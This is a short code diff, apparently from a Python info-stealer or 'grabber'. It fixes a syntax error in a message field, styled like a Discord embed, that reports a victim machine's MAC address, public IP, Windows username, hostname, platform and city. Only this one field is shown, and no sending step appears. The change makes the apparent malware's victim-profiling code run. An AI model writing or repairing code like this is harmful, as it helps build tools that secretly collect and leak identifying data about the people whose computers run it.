@@ -141,7 +141,7 @@ def main():
                     },
                     {
                         "name": "𝘊𝘖𝘔𝘗𝘜𝘛𝘌𝘙",
-                        "value": f'MAC : {(gma()).replace(":", "-").upper()}\nIP: {ipaddr).text}\nUsername : {os.getenv("UserName")}\nHostname : {os.getenv("COMPUTERNAME")}\nLocation : {platform}\nVille : {data["city"]}',
+                        "value": f'MAC : {(gma()).replace(":", "-").upper()}\nIP: {ipaddr.text}\nUsername : {os.getenv("UserName")}\nHostname : {os.getenv("COMPUTERNAME")}\nLocation : {platform}\nVille : {data["city"]}',
                         "inline": True
                     },
                     {
